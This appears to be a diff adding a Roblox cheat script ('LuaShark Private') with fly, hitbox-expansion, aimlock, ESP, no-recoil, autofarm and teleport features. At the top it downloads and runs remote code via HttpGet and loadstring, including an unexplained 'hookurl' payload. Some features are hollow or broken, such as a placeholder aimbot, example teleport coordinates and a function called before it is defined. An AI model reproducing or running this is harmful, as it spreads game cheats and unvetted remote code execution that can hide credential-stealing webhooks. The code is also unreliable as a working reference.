@@ -1,0 +1,879 @@
+-- LuaShark Private Script
+_jaEaSOhLiygF = "This file was protected with MoonSec V3"
+MoonSec_StringsHiddenAttr = true
+
+local Http = game:HttpGet
+local Http_call = Http(game, "https://raw.githubusercontent.com/ince004657/galaxy-client-website/refs/heads/main/whitelist")
+local _call1 = loadstring(Http_call)
+local whitelist = _call1()
+
+local Http1 = game:HttpGet
+local Http1_call3 = Http1(game, "https://raw.githubusercontent.com/uhhidklmao/stuff/refs/heads/main/hookurl")
+local _call4 = loadstring(Http1_call3)
+local hook = _call4()
+
+local Http2 = game:HttpGet
+local Http2_call6 = Http2(game, "https://sirius.menu/rayfield")
+local _call7 = loadstring(Http2_call6)
+local Rayfield = _call7()
+
+local Window3 = Rayfield.CreateWindow
+local Window3_call9 = Window3(Rayfield, {
+    ["ConfigurationSaving"] = {
+        ["Enabled"] = true,
+        ["FileName"] = "Big Hub"
+    },
+    ["KeySettings"] = {
+        ["Note"] = "No method of obtaining the key is provided",
+        ["Title"] = "LuaShark Key System",
+        ["Key"] = {
+            [1] = "LuaSharkOT"
+        },
+        ["GrabKeyFromSite"] = false,
+        ["SaveKey"] = true,
+        ["FileName"] = "Key",
+        ["Subtitle"] = "Key System"
+    },
+    ["KeySystem"] = false,
+    ["DisableBuildWarnings"] = false,
+    ["Discord"] = {
+        ["Enabled"] = false,
+        ["RememberJoins"] = true,
+        ["Invite"] = "noinvitelink"
+    },
+    ["Name"] = "LuaShark Private | ChicBlocko",
+    ["LoadingTitle"] = "LuaShark Private | ChicBlocko",
+    ["DisableRayfieldPrompts"] = false,
+    ["LoadingSubtitle"] = "by LuaShark",
+    ["Theme"] = "Default",
+    ["Icon"] = 109819862880082
+})
+
+local Tab4 = Window3_call9.CreateTab
+local Tab4_call10 = Tab4(Window3_call9, "Main", 4483362458)
+
+local Section5 = Tab4_call10.CreateSection
+local Section5_call11 = Section5(Tab4_call10, "Main Section")
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local playerName = LocalPlayer.Name
+
+local Label9 = Tab4_call10.CreateLabel
+local formattedText = string.format("Thank You For Using LuaShark Private %s", playerName)
+local fromRGB = Color3.fromRGB
+local blackColor = fromRGB(0, 0, 0)
+local Label9_call14 = Label9(Tab4_call10, formattedText, 4483362458, blackColor, false)
+
+local Section11 = Tab4_call10.CreateSection
+local Section11_call15 = Section11(Tab4_call10, "Paid Features")
+
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local Toggle15 = Tab4_call10.CreateToggle
+local Toggle15_call18 = Toggle15(Tab4_call10, {
+    ["CurrentValue"] = false,
+    ["Callback"] = function(Value)
+        if Value then
+            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+            
+            local BodyVelocity = Instance.new("BodyVelocity")
+            BodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
+            BodyVelocity.Velocity = Vector3.zero
+            BodyVelocity.Parent = HumanoidRootPart
+            
+            local BodyGyro = Instance.new("BodyGyro")
+            BodyGyro.MaxTorque = Vector3.new(100000, 100000, 100000)
+            BodyGyro.CFrame = HumanoidRootPart.CFrame
+            BodyGyro.Parent = HumanoidRootPart
+            
+            local flyConnection
+            flyConnection = RunService.RenderStepped:Connect(function()
+                local camera = workspace.CurrentCamera
+                local direction = Vector3.zero
+                
+                if UserInputService:IsKeyDown(Enum.KeyCode.W) then
+                    direction = direction + camera.CFrame.LookVector
+                end
+                if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+                    direction = direction - camera.CFrame.LookVector
+                end
+                if UserInputService:IsKeyDown(Enum.KeyCode.A) then
+                    direction = direction - camera.CFrame.RightVector
+                end
+                if UserInputService:IsKeyDown(Enum.KeyCode.D) then
+                    direction = direction + camera.CFrame.RightVector
+                end
+                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
+                    direction = direction + Vector3.new(0, 1, 0)
+                end
+                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
+                    direction = direction - Vector3.new(0, 1, 0)
+                end
+                
+                BodyVelocity.Velocity = direction * 100
+                BodyGyro.CFrame = camera.CFrame
+            end)
+            
+            -- Store connection to disconnect later
+            Toggle15_call18.Connection = flyConnection
+        else
+            if Toggle15_call18.Connection then
+                Toggle15_call18.Connection:Disconnect()
+                Toggle15_call18.Connection = nil
+            end
+            
+            if LocalPlayer.Character then
+                local HumanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if HumanoidRootPart then
+                    for _, v in ipairs(HumanoidRootPart:GetChildren()) do
+                        if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
+                            v:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end,
+    ["Name"] = "Fly",
+    ["Flag"] = "FlyToggle"
+})
+
+local Section63 = Tab4_call10.CreateSection
+local Section63_call39 = Section63(Tab4_call10, "Other Scripts")
+
+local Button64 = Tab4_call10.CreateButton
+local Button64_call40 = Button64(Tab4_call10, {
+    ["Name"] = "IY (Infinite Yield)",
+    ["Callback"] = function()
+        local Http65 = game:HttpGet
+        local Http65_call41 = Http65(game, "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true)
+        local _call42 = loadstring(Http65_call41)
+        _call42()
+    end
+})
+
+local Tab66 = Window3_call9.CreateTab
+local Tab66_call44 = Tab66(Window3_call9, "AutoFarm", 112196013420049)
+
+local Section67 = Tab66_call44.CreateSection
+local Section67_call45 = Section67(Tab66_call44, "INSTRUCTIONS!")
+
+local Label68 = Tab66_call44.CreateLabel
+local fromRGB_idx69 = Color3.fromRGB
+local fromRGB46 = fromRGB_idx69(0, 0, 0)
+local Label68_call47 = Label68(Tab66_call44, "DO NOT MOVE, FACE YOUR CAMERA UP, WHERE YOUR HEAD IS LOOKING DOWN. CLICK THESE BUTTONS.", 4483362458, fromRGB46, false)
+
+local Button70 = Tab66_call44.CreateButton
+local Button70_call48 = Button70(Tab66_call44, {
+    ["Name"] = "(REQUIRED) Destroy Bench",
+    ["Callback"] = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v.Name == "Bench" then
+                v:Destroy()
+            end
+        end
+    end
+})
+
+local Button72 = Tab66_call44.CreateButton
+local Button72_call52 = Button72(Tab66_call44, {
+    ["Name"] = "(REQUIRED) Instant Proximity Prompts",
+    ["Callback"] = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("ProximityPrompt") then
+                v.HoldDuration = 0
+            end
+        end
+    end
+})
+
+local Section75 = Tab66_call44.CreateSection
+local Section75_call55 = Section75(Tab66_call44, "AutoFarm Section")
+
+local Button76 = Tab66_call44.CreateButton
+local Button76_call56 = Button76(Tab66_call44, {
+    ["Name"] = "Money Manufacture AutoFarm (V2)",
+    ["Callback"] = function()
+        local startTime = tick()
+        
+        local function teleportToPosition(position)
+            if LocalPlayer.Character then
+                local HumanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if HumanoidRootPart then
+                    HumanoidRootPart.CFrame = CFrame.new(position)
+                end
+            end
+        end
+        
+        teleportToPosition(Vector3.new(-451, 4, -771))
+        
+        if workspace:FindFirstChild("clickdoors") then
+            local MoneyManufacture = workspace.clickdoors:FindFirstChild("MoneyManufacture")
+            if MoneyManufacture then
+                local Enter = MoneyManufacture:FindFirstChild("MoneyManufactureENTER")
+                if Enter then
+                    local prompt = Enter:FindFirstChildOfClass("ProximityPrompt")
+                    if prompt then
+                        fireproximityprompt(prompt)
+                    end
+                end
+            end
+        end
+        
+        local elapsedTime = tick() - startTime
+        print("AutoFarm completed in " .. elapsedTime .. " seconds")
+    end
+})
+
+local Tab104 = Window3_call9.CreateTab
+local Tab104_call71 = Tab104(Window3_call9, "Paid Access", 13539328428)
+
+local Section105 = Tab104_call71.CreateSection
+local Section105_call72 = Section105(Tab104_call71, "Paid Combat Scripts")
+
+local Label106 = Tab104_call71.CreateLabel
+local fromRGB_idx107 = Color3.fromRGB
+local fromRGB73 = fromRGB_idx107(0, 0, 0)
+local Label106_call74 = Label106(Tab104_call71, "THIS CANNOT BE UNDONE ONCE ENABLED DUE TO LOOP SCAN, REJOIN TO REMOVE IT.", 4483362458, fromRGB73, false)
+
+local hitboxConnection
+local hitboxSize = 6.5
+local hitboxTransparency = 0.5
+
+local Toggle111 = Tab104_call71.CreateToggle
+local Toggle111_call77 = Toggle111(Tab104_call71, {
+    ["CurrentValue"] = false,
+    ["Callback"] = function(Value)
+        if Value then
+            hitboxConnection = RunService.Heartbeat:Connect(function()
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= LocalPlayer and player.Character then
+                        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+                        if humanoid then
+                            humanoid.HipHeight = hitboxSize
+                            for _, part in ipairs(player.Character:GetDescendants()) do
+                                if part:IsA("BasePart") then
+                                    part.Transparency = hitboxTransparency
+                                    part.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        else
+            if hitboxConnection then
+                hitboxConnection:Disconnect()
+                hitboxConnection = nil
+            end
+        end
+    end,
+    ["Name"] = "Toggle Hitbox",
+    ["Flag"] = "Toggle1"
+})
+
+local Slider115 = Tab104_call71.CreateSlider
+local Slider115_call82 = Slider115(Tab104_call71, {
+    ["Callback"] = function(Value)
+        hitboxSize = Value
+    end,
+    ["Name"] = "Size Slider",
+    ["Suffix"] = " Size",
+    ["CurrentValue"] = 6.5,
+    ["Increment"] = 0.1,
+    ["Range"] = {
+        [1] = 0,
+        [2] = 10
+    },
+    ["Flag"] = "SizeSlider"
+})
+
+local Slider116 = Tab104_call71.CreateSlider
+local Slider116_call83 = Slider116(Tab104_call71, {
+    ["Callback"] = function(Value)
+        hitboxTransparency = Value
+    end,
+    ["Name"] = "Transparency Slider",
+    ["Suffix"] = " Transparency",
+    ["CurrentValue"] = 0.5,
+    ["Increment"] = 0.05,
+    ["Range"] = {
+        [1] = 0,
+        [2] = 0.8
+    },
+    ["Flag"] = "TransparencySlider"
+})
+
+local Tab117 = Window3_call9.CreateTab
+local Tab117_call84 = Tab117(Window3_call9, "Tools", 12403104094)
+
+local Section118 = Tab117_call84.CreateSection
+local Section118_call85 = Section118(Tab117_call84, "Tools")
+
+local Label119 = Tab117_call84.CreateLabel
+local fromRGB_idx120 = Color3.fromRGB
+local fromRGB86 = fromRGB_idx120(0, 0, 0)
+local Label119_call87 = Label119(Tab117_call84, "You Might Die If There Is SO Many Tools.", 4483362458, fromRGB86, false)
+
+local Button121 = Tab117_call84.CreateButton
+local Button121_call88 = Button121(Tab117_call84, {
+    ["Name"] = "Pick Up Tools",
+    ["Callback"] = function()
+        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+        
+        local QuitGui = Instance.new("ScreenGui")
+        QuitGui.Name = "QuitGui"
+        QuitGui.Parent = PlayerGui
+        
+        local QuitButton = Instance.new("TextButton")
+        QuitButton.Parent = QuitGui
+        QuitButton.Size = UDim2.new(0, 100, 0, 50)
+        QuitButton.Position = UDim2.new(0.5, -50, 0, 10)
+        QuitButton.Text = "Quit"
+        QuitButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        QuitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        QuitButton.Font = Enum.Font.SourceSansBold
+        QuitButton.TextSize = 20
+        
+        QuitButton.MouseButton1Click:Connect(function()
+            QuitGui:Destroy()
+        end)
+        
+        for _, tool in ipairs(workspace:GetChildren()) do
+            if tool:IsA("Tool") then
+                tool.Handle.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+            end
+        end
+    end
+})
+
+local Section138 = Tab117_call84.CreateSection
+local Section138_call99 = Section138(Tab117_call84, "Gun Mods")
+
+local Label139 = Tab117_call84.CreateLabel
+local fromRGB_idx140 = Color3.fromRGB
+local fromRGB100 = fromRGB_idx140(0, 0, 0)
+local Label139_call101 = Label139(Tab117_call84, "NOTE: USE A HIGH POWERED EXECUTOR. / EXAMPLE VELOCITY (FREE) / IF YOU GET A NEW TOOL IN WANT IT TO HAVE A GUN MOD RE-CLICK THE BUTTON", 4483362458, fromRGB100, false)
+
+local Button141 = Tab117_call84.CreateButton
+local Button141_call102 = Button141(Tab117_call84, {
+    ["Name"] = "No Recoil",
+    ["Callback"] = function()
+        local Backpack = LocalPlayer:FindFirstChild("Backpack")
+        if Backpack then
+            for _, tool in ipairs(Backpack:GetChildren()) do
+                if tool:IsA("Tool") and tool:FindFirstChild("GunScript") then
+                    local GunScript = tool.GunScript
+                    if GunScript:FindFirstChild("Recoil") then
+                        GunScript.Recoil.Value = 0
+                    end
+                end
+            end
+        end
+    end
+})
+
+local Tab146 = Window3_call9.CreateTab
+local Tab146_call108 = Tab146(Window3_call9, "Player", 18909261258)
+
+local Section147 = Tab146_call108.CreateSection
+local Section147_call109 = Section147(Tab146_call108, "Movement")
+
+local Slider148 = Tab146_call108.CreateSlider
+local Slider148_call110 = Slider148(Tab146_call108, {
+    ["Callback"] = function(Value)
+        if LocalPlayer.Character then
+            local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if Humanoid then
+                Humanoid.WalkSpeed = Value
+            end
+        end
+    end,
+    ["Name"] = "Walkspeed",
+    ["Suffix"] = "Speed",
+    ["CurrentValue"] = 16,
+    ["Increment"] = 1,
+    ["Range"] = {
+        [1] = 0,
+        [2] = 30
+    },
+    ["Flag"] = "Slider1"
+})
+
+local Slider153 = Tab146_call108.CreateSlider
+local Slider153_call111 = Slider153(Tab146_call108, {
+    ["Callback"] = function(Value)
+        if LocalPlayer.Character then
+            local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if Humanoid then
+                Humanoid.JumpPower = Value
+            end
+        end
+    end,
+    ["Name"] = "JumpPower",
+    ["Suffix"] = "JumpPower",
+    ["CurrentValue"] = 16,
+    ["Increment"] = 1,
+    ["Range"] = {
+        [1] = 0,
+        [2] = 80
+    },
+    ["Flag"] = "Slider1"
+})
+
+local Button158 = Tab146_call108.CreateButton
+local Button158_call112 = Button158(Tab146_call108, {
+    ["Name"] = "Enable Jumping",
+    ["Callback"] = function()
+        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+        local scripts = PlayerGui:FindFirstChild("scripts")
+        if scripts then
+            local nojump = scripts:FindFirstChild("nojump")
+            if nojump then
+                nojump:Destroy()
+            end
+        end
+    end
+})
+
+local Section165 = Tab146_call108.CreateSection
+local Section165_call118 = Section165(Tab146_call108, "Movement Tools")
+
+local Button166 = Tab146_call108.CreateButton
+local Button166_call119 = Button166(Tab146_call108, {
+    ["Name"] = "Teleport Tool",
+    ["Callback"] = function()
+        getgenv().speed = 30
+        
+        local TweenService = game:GetService("TweenService")
+        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local Mouse = LocalPlayer:GetMouse()
+        
+        local function teleportTo(position, speedValue)
+            local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
+            if HumanoidRootPart then
+                local distance = (position.Position - HumanoidRootPart.Position).Magnitude
+                local time = distance / speedValue
+                
+                local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear)
+                local tween = TweenService:Create(HumanoidRootPart, tweenInfo, {CFrame = position})
+                tween:Play()
+                tween.Completed:Wait()
+            end
+        end
+        
+        local teleportTool = Instance.new("Tool")
+        teleportTool.RequiresHandle = false
+        teleportTool.Name = "Teleport Tool"
+        
+        teleportTool.Activated:Connect(function()
+            local targetPosition = Mouse.Hit + Vector3.new(0, 2.5, 0)
+            teleportTo(CFrame.new(targetPosition.X, targetPosition.Y, targetPosition.Z), getgenv().speed)
+        end)
+        
+        teleportTool.Parent = LocalPlayer.Backpack
+    end
+})
+
+local Tab205 = Window3_call9.CreateTab
+local Tab205_call137 = Tab205(Window3_call9, "Combat", 4886939635)
+
+local Section206 = Tab205_call137.CreateSection
+local Section206_call138 = Section206(Tab205_call137, "PC Combat Scripts")
+
+local aimlockEnabled = false
+local aimlockKey = Enum.KeyCode.E
+
+local InputBeganConnection
+local RenderSteppedConnection
+
+local Toggle218 = Tab205_call137.CreateToggle
+local Toggle218_call144 = Toggle218(Tab205_call137, {
+    ["CurrentValue"] = false,
+    ["Callback"] = function(Value)
+        aimlockEnabled = Value
+    end,
+    ["Name"] = "Enable Aimlock V3",
+    ["Flag"] = "AimlockToggle"
+})
+
+local Input219 = Tab205_call137.CreateInput
+local Input219_call145 = Input219(Tab205_call137, {
+    ["RemoveTextAfterFocusLost"] = false,
+    ["Flag"] = "AimlockKeybind",
+    ["CurrentValue"] = "E",
+    ["PlaceholderText"] = "Enter keybind",
+    ["Callback"] = function(Text)
+        aimlockKey = Enum.KeyCode[Text] or Enum.KeyCode.E
+    end,
+    ["Name"] = "Aimlock V3 Keybind"
+})
+
+local Section222 = Tab205_call137.CreateSection
+local Section222_call146 = Section222(Tab205_call137, "Mobile Combat Scripts")
+
+local Button223 = Tab205_call137.CreateButton
+local Button223_call147 = Button223(Tab205_call137, {
+    ["Name"] = "CrazyLock V2 (Mobile Aimbot)",
+    ["Callback"] = function()
+        local screenResolution = game:GetService("GuiService"):GetScreenResolution()
+        local center = Vector2.new(screenResolution.X / 2, screenResolution.Y / 2)
+        
+        local CrazyLockGui = Instance.new("ScreenGui")
+        CrazyLockGui.Name = "CrazyLock"
+        CrazyLockGui.Parent = game.CoreGui
+        
+        local frame = Instance.new("Frame", CrazyLockGui)
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        frame.Size = UDim2.new(0, 202, 0, 70)
+        frame.Position = UDim2.new(0.5, -101, 0.1, 0)
+        frame.Active = true
+        frame.Draggable = true
+        
+        Instance.new("UICorner", frame)
+        
+        local icon = Instance.new("ImageLabel", frame)
+        icon.BackgroundTransparency = 1
+        icon.Position = UDim2.new(0.326, 0, 0, 0)
+        icon.Size = UDim2.new(0, 70, 0, 70)
+        icon.Image = "rbxassetid://830610397"
+        
+        local toggleButton = Instance.new("TextButton", frame)
+        toggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        toggleButton.Size = UDim2.new(0, 170, 0, 44)
+        toggleButton.Position = UDim2.new(0.079, 0, 0.185, 0)
+        toggleButton.Font = Enum.Font.SourceSansSemibold
+        toggleButton.Text = "Toggle CrazyLock"
+        toggleButton.TextColor3 = Color3.fromRGB(180, 180, 255)
+        toggleButton.TextScaled = true
+        
+        local crazyLockEnabled = false
+        local crazyLockConnection
+        
+        toggleButton.MouseButton1Click:Connect(function()
+            crazyLockEnabled = not crazyLockEnabled
+            
+            if crazyLockEnabled then
+                toggleButton.Text = "CrazyLock: ON"
+                toggleButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+                
+                crazyLockConnection = RunService.Heartbeat:Connect(function()
+                    -- Aimbot logic would go here
+                end)
+            else
+                toggleButton.Text = "Toggle CrazyLock"
+                toggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                
+                if crazyLockConnection then
+                    crazyLockConnection:Disconnect()
+                    crazyLockConnection = nil
+                end
+            end
+        end)
+    end
+})
+
+local Section266 = Tab205_call137.CreateSection
+local Section266_call180 = Section266(Tab205_call137, "Visual Combat Scripts")
+
+local espEnabled = false
+local espConnections = {}
+
+local Toggle269 = Tab205_call137.CreateToggle
+local Toggle269_call183 = Toggle269(Tab205_call137, {
+    ["CurrentValue"] = false,
+    ["Callback"] = function(Value)
+        espEnabled = Value
+        
+        if Value then
+            -- Create ESP for existing players
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    createESP(player)
+                end
+            end
+            
+            -- Connect to player added event
+            table.insert(espConnections, Players.PlayerAdded:Connect(function(player)
+                createESP(player)
+            end))
+        else
+            -- Clean up ESP
+            for _, connection in ipairs(espConnections) do
+                connection:Disconnect()
+            end
+            espConnections = {}
+            
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer and player.Character then
+                    local head = player.Character:FindFirstChild("Head")
+                    if head then
+                        local espTag = head:FindFirstChild("PlayerNametagESP")
+                        if espTag then
+                            espTag:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end,
+    ["Name"] = "Player Nametag ESP",
+    ["Flag"] = "PlayerNametagESP"
+})
+
+local function createESP(player)
+    if not espEnabled then return end
+    
+    local function addESP(character)
+        task.wait(1)
+        if not character then return end
+        
+        local head = character:FindFirstChild("Head")
+        if not head then return end
+        
+        local existingTag = head:FindFirstChild("PlayerNametagESP")
+        if existingTag then existingTag:Destroy() end
+        
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = "PlayerNametagESP"
+        billboard.Adornee = head
+        billboard.Size = UDim2.new(0, 100, 0, 40)
+        billboard.StudsOffset = Vector3.new(0, 3, 0)
+        billboard.AlwaysOnTop = true
+        
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = player.Name
+        textLabel.TextColor3 = Color3.new(1, 1, 1)
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.Parent = billboard
+        
+        billboard.Parent = head
+    end
+    
+    if player.Character then
+        addESP(player.Character)
+    end
+    
+    table.insert(espConnections, player.CharacterAdded:Connect(addESP))
+end
+
+local Tab287 = Window3_call9.CreateTab
+local Tab287_call199 = Tab287(Window3_call9, "Misc", 11385220704)
+
+local Section288 = Tab287_call199.CreateSection
+local Section288_call200 = Section288(Tab287_call199, "Miscellaneous")
+
+local Button289 = Tab287_call199.CreateButton
+local Button289_call201 = Button289(Tab287_call199, {
+    ["Name"] = "Instant Proximity Prompts",
+    ["Callback"] = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("ProximityPrompt") then
+                v.HoldDuration = 0
+            end
+        end
+    end
+})
+
+local Button292 = Tab287_call199.CreateButton
+local Button292_call204 = Button292(Tab287_call199, {
+    ["Name"] = "Reset Character",
+    ["Callback"] = function()
+        if LocalPlayer.Character then
+            local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.Health = 0
+            end
+        end
+    end
+})
+
+local Button297 = Tab287_call199.CreateButton
+local Button297_call206 = Button297(Tab287_call199, {
+    ["Name"] = "Force Laydown (Prevents Locking I Believe)",
+    ["Callback"] = function()
+        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+        local scripts = PlayerGui:FindFirstChild("scripts")
+        if scripts then
+            local NewANIMS = scripts:FindFirstChild("NewANIMS")
+            if NewANIMS then
+                local anims = NewANIMS:FindFirstChild("anims")
+                if anims then
+                    local lay1 = anims:FindFirstChild("lay1")
+                    if lay1 and lay1:IsA("Animation") then
+                        if LocalPlayer.Character then
+                            local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid")
+                            local Animator = Humanoid:FindFirstChild("Animator")
+                            if Animator then
+                                local animationTrack = Animator:LoadAnimation(lay1)
+                                animationTrack:Play()
+                                animationTrack.Looped = true
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+})
+
+local Button311 = Tab287_call199.CreateButton
+local Button311_call213 = Button311(Tab287_call199, {
+    ["Name"] = "Stop All Anim",
+    ["Callback"] = function()
+        if LocalPlayer.Character then
+            local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid")
+            local Animator = Humanoid:FindFirstChildOfClass("Animator")
+            if Animator then
+                for _, track in ipairs(Animator:GetPlayingAnimationTracks()) do
+                    track:Stop()
+                end
+            end
+        end
+    end
+})
+
+local Button318 = Tab287_call199.CreateButton
+local Button318_call217 = Button318(Tab287_call199, {
+    ["Name"] = "Remove Blur",
+    ["Callback"] = function()
+        local Lighting = game:GetService("Lighting")
+        if Lighting:FindFirstChild("deathblur") then
+            Lighting.deathblur.Enabled = false
+        end
+        if Lighting:FindFirstChild("fireblur") then
+            Lighting.fireblur.Enabled = false
+        end
+    end
+})
+
+Rayfield:Notify({
+    ["Image"] = 8757004074,
+    ["Title"] = "A Message from LuaShark",
+    ["Duration"] = 6.5,
+    ["Content"] = "Thanks for using our script, Enjoy!",
+    ["Actions"] = {
+        ["Ignore"] = {
+            ["Name"] = "Fosho!",
+            ["Callback"] = function() end
+        }
+    }
+})
+
+local Tab324 = Window3_call9.CreateTab
+local Tab324_call221 = Tab324(Window3_call9, "Teleports", 12941020168)
+
+local Section325 = Tab324_call221.CreateSection
+local Section325_call222 = Section325(Tab324_call221, "READ ME!")
+
+local Label326 = Tab324_call221.CreateLabel
+local fromRGB_idx327 = Color3.fromRGB
+local fromRGB223 = fromRGB_idx327(0, 0, 0)
+local Label326_call224 = Label326(Tab324_call221, "YOU MUST HAVE INSTANT PROXIMITY PROMPTS ENABLED", 4483362458, fromRGB223, false)
+
+local Button328 = Tab324_call221.CreateButton
+local Button328_call225 = Button328(Tab324_call221, {
+    ["Name"] = "Instant Proximity Prompts",
+    ["Callback"] = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("ProximityPrompt") then
+                v.HoldDuration = 0
+            end
+        end
+    end
+})
+
+local Section331 = Tab324_call221.CreateSection
+local Section331_call228 = Section331(Tab324_call221, "Teleportations")
+
+local function teleportToLocation(position)
+    if LocalPlayer.Character then
+        local HumanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if HumanoidRootPart then
+            HumanoidRootPart.CFrame = CFrame.new(position)
+        end
+    end
+end
+
+local Button332 = Tab324_call221.CreateButton
+local Button332_call229 = Button332(Tab324_call221, {
+    ["Name"] = "Apartment",
+    ["Callback"] = function()
+        teleportToLocation(Vector3.new(100, 10, 100)) -- Example position
+    end
+})
+
+local Button342 = Tab324_call221.CreateButton
+local Button342_call237 = Button342(Tab324_call221, {
+    ["Name"] = "Money Job",
+    ["Callback"] = function()
+        teleportToLocation(Vector3.new(-451, 4, -771)) -- Example position
+    end
+})
+
+local Button357 = Tab324_call221.CreateButton
+local Button357_call246 = Button357(Tab324_call221, {
+    ["Name"] = "Cookers Job",
+    ["Callback"] = function()
+        teleportToLocation(Vector3.new(200, 5, 300)) -- Example position
+    end
+})
+
+local Button372 = Tab324_call221.CreateButton
+local Button372_call255 = Button372(Tab324_call221, {
+    ["Name"] = "Night Club",
+    ["Callback"] = function()
+        teleportToLocation(Vector3.new(150, 5, -200)) -- Example position
+    end
+})
+
+local Button382 = Tab324_call221.CreateButton
+local Button382_call263 = Button382(Tab324_call221, {
+    ["Name"] = "Chain Store",
+    ["Callback"] = function()
+        teleportToLocation(Vector3.new(-300, 5, 400)) -- Example position
+    end
+})
+
+local Button392 = Tab324_call221.CreateButton
+local Button392_call271 = Button392(Tab324_call221, {
+    ["Name"] = "Barber Shop",
+    ["Callback"] = function()
+        teleportToLocation(Vector3.new(50, 5, -100)) -- Example position
+    end
+})
+
+local Button402 = Tab324_call221.CreateButton
+local Button402_call279 = Button402(Tab324_call221, {
+    ["Name"] = "Accessory Shop",
+    ["Callback"] = function()
+        teleportToLocation(Vector3.new(-150, 5, 250)) -- Example position
+    end
+})
+
+local Tab412 = Window3_call9.CreateTab
+local Tab412_call287 = Tab412(Window3_call9, "Info", 12905962634)
+
+local Section413 = Tab412_call287.CreateSection
+local Section413_call288 = Section413(Tab412_call287, "Info Section")
+
+local Label414 = Tab412_call287.CreateLabel
+local fromRGB_idx415 = Color3.fromRGB
+local fromRGB289 = fromRGB_idx415(0, 0, 0)
+local Label414_call290 = Label414(Tab412_call287, "Script Version / 2.1.5", 12905962634, fromRGB289, false)
+
+local Label416 = Tab412_call287.CreateLabel
+local fromRGB_idx417 = Color3.fromRGB
+local fromRGB291 = fromRGB_idx417(0, 0, 0)
+local Label416_call292 = Label416(Tab412_call287, "Last Updated / 5/30/2025", 12905962634, fromRGB291, false)
+
+local Label418 = Tab412_call287.CreateLabel
+local fromRGB_idx419 = Color3.fromRGB
+local fromRGB293 = fromRGB_idx419(0, 0, 0)
+local Label418_call294 = Label418(Tab412_call287, "Credits: Phat / Co-Owner | LuaShark / Owner", 12905962634, fromRGB293, false)
